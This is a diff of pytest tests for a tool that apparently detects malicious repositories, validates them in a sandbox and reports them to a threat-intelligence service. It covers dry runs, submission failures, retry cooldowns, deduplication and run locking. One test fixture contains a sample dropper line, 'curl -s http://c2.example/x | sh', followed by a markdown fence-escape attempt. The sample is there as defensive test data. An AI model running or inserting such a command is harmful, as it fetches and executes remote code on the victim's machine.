@@ -78,21 +78,39 @@ def test_policy_rejects_disabled_shared_intel_dedup():
         auto._validate_policy(policy)
 
 
-def test_second_osm_precheck_closes_race_before_post(monkeypatch):
+@pytest.fixture
+def db(tmp_path, monkeypatch):
+    from git_warden.db import Database
+    from git_warden.scanning import sandbox_runner
+
+    database = Database.open(tmp_path / "warden.sqlite")
+    with database.transaction() as c:
+        c.execute("INSERT INTO repo_findings (full_name, detection_method) "
+                  "VALUES ('seed/finding', 'code_search')")
+    database.dprk_infra_hosts = lambda exclude=None: set()
+    monkeypatch.setattr(sandbox_runner, "docker_available", lambda: True)
+    monkeypatch.setattr(auto, "load_policy", lambda: _POLICY)
+    monkeypatch.setattr(auto.bus, "submitted_targets", lambda: set())
+    monkeypatch.setattr(auto.bus, "mark_submitted", lambda *a, **k: None)
+    monkeypatch.setattr(auto.time, "sleep", lambda s: None)
+    yield database
+    database.close()
+
+
+_POLICY = auto.load_policy()
+
+
+def test_second_osm_precheck_closes_race_before_post(monkeypatch, db):
     row = {"full_name": "evil/dropper"}
-    policy = auto.load_policy().copy()
     checks = iter([None, {"id": "race", "status": "pending"}])
 
-    monkeypatch.setattr(auto, "load_policy", lambda: policy)
     monkeypatch.setattr(auto, "gold_for_submission", lambda db, limit=0: [row])
-    monkeypatch.setattr(auto.bus, "is_submitted", lambda kind, value: False)
     monkeypatch.setattr(auto, "_existing_repo", lambda name: next(checks))
     monkeypatch.setattr(auto, "_deep_validate", lambda name: (True, "AUTO", None))
     monkeypatch.setattr(auto, "repo_payload_live", lambda finding: True)
     monkeypatch.setattr(auto, "submit_threat", lambda report: pytest.fail("must not POST"))
 
-    sent = auto.run(object(), limit=1, pace=0)
-    assert sent == 0
+    assert auto.run(db, limit=1) == (0, 0)
 
 
 # --- "Validated malicious repo" markdown summary ------------------------------
@@ -112,23 +130,13 @@ class _Tier2:
         self.confirming_findings = findings
 
 
-_POLICY = auto.load_policy()
-
-
-class _DB:
-    def dprk_infra_hosts(self, exclude=None):
-        return set()
-
-
-def _validated_run(monkeypatch, tmp_path, *, dry_run, submit=None):
+def _validated_run(monkeypatch, tmp_path, db, *, dry_run, submit=None):
     row = {"full_name": "evil/dropper", "score": 91, "detection_method": "code_search"}
     finding = _Finding("install.sh", 7, "curl -s http://c2.example/x | sh\n```\n# [x](http://a)")
     report = {"severity_level": "critical", "tags": ["dropper", "dprk"],
               "verified_iocs": "c2.example", "threat_description": "Drops a payload."}
     marks = []
-    monkeypatch.setattr(auto, "load_policy", lambda: _POLICY)
     monkeypatch.setattr(auto, "gold_for_submission", lambda db, limit=0: [row])
-    monkeypatch.setattr(auto.bus, "is_submitted", lambda kind, value: False)
     monkeypatch.setattr(auto.bus, "mark_submitted", lambda *a, **k: marks.append(("bus", a)))
     monkeypatch.setattr(auto, "_existing_repo", lambda name: None)
     monkeypatch.setattr(auto, "_deep_validate",
@@ -144,13 +152,13 @@ def _validated_run(monkeypatch, tmp_path, *, dry_run, submit=None):
         auto, "submit_threat",
         submit or (lambda report: pytest.fail("validate-only run must not POST")))
     out = tmp_path / "summary.md"
-    sent = auto.run(_DB(), limit=1, pace=0, dry_run=dry_run, summary_path=out)
-    return sent, out.read_text(encoding="utf-8"), marks
+    result = auto.run(db, limit=1, dry_run=dry_run, summary_path=out)
+    return result, out.read_text(encoding="utf-8"), marks
 
 
-def test_dry_run_reports_validated_repo_not_yet_in_osm(monkeypatch, tmp_path):
-    sent, md, marks = _validated_run(monkeypatch, tmp_path, dry_run=True)
-    assert sent == 0
+def test_dry_run_reports_validated_repo_not_yet_in_osm(monkeypatch, tmp_path, db):
+    (sent, errors), md, marks = _validated_run(monkeypatch, tmp_path, db, dry_run=True)
+    assert (sent, errors) == (0, 0)
     assert marks == []  # no claim, no shared-intel mark, no POST
     assert "### Validated malicious repo: `evil/dropper`" in md
     assert "NOT YET REPORTED TO OSM" in md
@@ -161,22 +169,24 @@ def test_dry_run_reports_validated_repo_not_yet_in_osm(monkeypatch, tmp_path):
     assert "validate-only" in md
 
 
-def test_submit_run_records_threat_id_in_summary(monkeypatch, tmp_path):
-    sent, md, marks = _validated_run(
-        monkeypatch, tmp_path, dry_run=False, submit=lambda report: {"threat_id": "t-42"})
-    assert sent == 1
+def test_submit_run_records_threat_id_in_summary(monkeypatch, tmp_path, db):
+    (sent, errors), md, marks = _validated_run(
+        monkeypatch, tmp_path, db, dry_run=False,
+        submit=lambda report: {"threat_id": "t-42"})
+    assert (sent, errors) == (1, 0)
     assert ("claim", "evil/dropper", "t-42") in marks
     assert "submitted** as `t-42`" in md
     assert "NOT YET REPORTED" not in md
 
 
-def test_failed_post_is_summarised_as_not_reported(monkeypatch, tmp_path):
+def test_failed_post_is_counted_and_does_not_abort_run(monkeypatch, tmp_path, db):
     def boom(report):
         raise RuntimeError("HTTP 500")
 
-    with pytest.raises(RuntimeError):
-        _validated_run(monkeypatch, tmp_path, dry_run=False, submit=boom)
-    md = (tmp_path / "summary.md").read_text(encoding="utf-8")
+    (sent, errors), md, marks = _validated_run(
+        monkeypatch, tmp_path, db, dry_run=False, submit=boom)
+    assert (sent, errors) == (0, 1)
+    assert ("unclaim", "evil/dropper") in marks
     assert "NOT REPORTED TO OSM" in md and "POST failed" in md
 
 
@@ -185,15 +195,120 @@ def test_untrusted_snippet_cannot_escape_its_code_fence():
     assert fenced.startswith("`````text\n") and fenced.endswith("\n`````")
 
 
-def test_skipped_candidates_are_listed_in_summary(monkeypatch, tmp_path):
+def test_skipped_candidates_are_listed_in_summary(monkeypatch, tmp_path, db):
     monkeypatch.setattr(auto, "gold_for_submission",
                         lambda db, limit=0: [{"full_name": "gone/repo"}])
-    monkeypatch.setattr(auto.bus, "is_submitted", lambda kind, value: False)
     monkeypatch.setattr(auto, "_existing_repo", lambda name: None)
     monkeypatch.setattr(auto, "_deep_validate",
                         lambda name: (False, "sandbox scan produced no result", None))
     out = tmp_path / "summary.md"
-    auto.run(object(), limit=1, pace=0, dry_run=True, summary_path=out)
+    auto.run(db, limit=1, dry_run=True, summary_path=out)
     md = out.read_text(encoding="utf-8")
     assert "Validated malicious repos: **0**" in md
-    assert "| `gone/repo` | deep validation failed closed: sandbox scan produced no result |" in md
+    assert ("| `gone/repo` | deep validation failed closed: "
+            "sandbox scan produced no result |") in md
+
+
+# --- Unattended-run hardening -----------------------------------------------
+
+
+def test_cli_overrides_can_only_tighten_policy():
+    cap, pace = _POLICY["max_submissions_per_run"], _POLICY["pace_seconds"]
+    assert auto._effective_limits(_POLICY, 0, 0) == (1, pace)      # 0 is NOT unlimited
+    assert auto._effective_limits(_POLICY, 500, None) == (cap, pace)
+    assert auto._effective_limits(_POLICY, 3, 60) == (3, 60)
+
+
+def test_failed_candidates_cool_down_instead_of_starving_queue(monkeypatch, db):
+    rows = [{"full_name": "a/stale"}, {"full_name": "b/fresh"}]
+    scanned = []
+    monkeypatch.setattr(auto, "gold_for_submission", lambda db, limit=0: rows)
+    monkeypatch.setattr(auto, "_existing_repo", lambda name: None)
+    monkeypatch.setattr(
+        auto, "_deep_validate",
+        lambda name: (scanned.append(name),
+                      (False, "scan no longer confirms", _Tier2([])))[1])
+
+    auto.run(db, limit=1, dry_run=True, now=1_000_000)
+    auto.run(db, limit=1, dry_run=True, now=1_000_000 + 3600)
+    assert scanned == ["a/stale", "b/fresh"]  # 2nd run moves past the failure
+    auto.run(db, limit=1, dry_run=True, now=1_000_000 + auto.RETRY_AFTER_SECONDS + 1)
+    assert scanned[-1] == "a/stale"  # retried once the cooldown expires
+
+
+def test_transient_failures_retry_sooner(monkeypatch, db):
+    monkeypatch.setattr(auto, "gold_for_submission",
+                        lambda db, limit=0: [{"full_name": "flaky/repo"}])
+    monkeypatch.setattr(auto, "_existing_repo", lambda name: None)
+    scanned = []
+    monkeypatch.setattr(
+        auto, "_deep_validate",
+        lambda name: (scanned.append(name), (False, "sandbox scan produced no result",
+                                             None))[1])
+    t0 = 2_000_000
+    auto.run(db, dry_run=True, now=t0)
+    auto.run(db, dry_run=True, now=t0 + auto.TRANSIENT_RETRY_SECONDS - 1)
+    auto.run(db, dry_run=True, now=t0 + auto.TRANSIENT_RETRY_SECONDS + 1)
+    assert scanned == ["flaky/repo", "flaky/repo"]
+
+
+def test_cheap_skips_do_not_consume_scan_limit(monkeypatch, db, tmp_path):
+    rows = [{"full_name": f"known/r{i}"} for i in range(5)] + [{"full_name": "new/repo"}]
+    monkeypatch.setattr(auto, "gold_for_submission", lambda db, limit=0: rows)
+    monkeypatch.setattr(auto, "_existing_repo",
+                        lambda name: {"id": "x", "status": "verified"}
+                        if name.startswith("known/") else None)
+    scanned = []
+    monkeypatch.setattr(
+        auto, "_deep_validate",
+        lambda name: (scanned.append(name), (False, "n/a", None))[1])
+    auto.run(db, limit=1, dry_run=True)
+    assert scanned == ["new/repo"]
+
+
+def test_shared_intel_dedup_matches_any_spelling(monkeypatch):
+    monkeypatch.setattr(auto.bus, "submitted_targets",
+                        lambda: {"repository:github.com/Evil/Dropper/"})
+    assert auto._bus_submitted("evil/dropper")
+    assert not auto._bus_submitted("evil/other")
+
+
+def test_empty_hunt_data_blocks_run_loudly(tmp_path, monkeypatch):
+    from git_warden.db import Database
+
+    empty = Database.open(tmp_path / "empty.sqlite")
+    monkeypatch.setattr(auto, "load_policy", lambda: _POLICY)
+    out = tmp_path / "summary.md"
+    with pytest.raises(auto.AutomationBlocked):
+        auto.run(empty, dry_run=True, summary_path=out)
+    empty.close()
+    assert "Run blocked:** no hunt data" in out.read_text(encoding="utf-8")
+
+
+def test_missing_sandbox_blocks_run_loudly(monkeypatch, db):
+    from git_warden.scanning import sandbox_runner
+
+    monkeypatch.setattr(auto, "gold_for_submission",
+                        lambda db, limit=0: [{"full_name": "evil/dropper"}])
+    monkeypatch.setattr(sandbox_runner, "docker_available", lambda: False)
+    with pytest.raises(auto.AutomationBlocked):
+        auto.run(db, dry_run=True)
+
+
+def test_cli_missing_database_exits_nonzero_with_summary(tmp_path):
+    out = tmp_path / "summary.md"
+    code = auto.main(["--dry-run", "--db", str(tmp_path / "nope" / "w.sqlite"),
+                      "--summary-md", str(out)])
+    assert code == 2
+    assert "Run blocked:** no hunt data" in out.read_text(encoding="utf-8")
+    assert not (tmp_path / "nope").exists()  # never creates an empty DB
+
+
+def test_run_lock_rejects_overlapping_run(tmp_path):
+    pytest.importorskip("fcntl")
+    first = auto._acquire_run_lock(tmp_path / "osm.lock")
+    try:
+        assert first is not None
+        assert auto._acquire_run_lock(tmp_path / "osm.lock") is None
+    finally:
+        first.close()
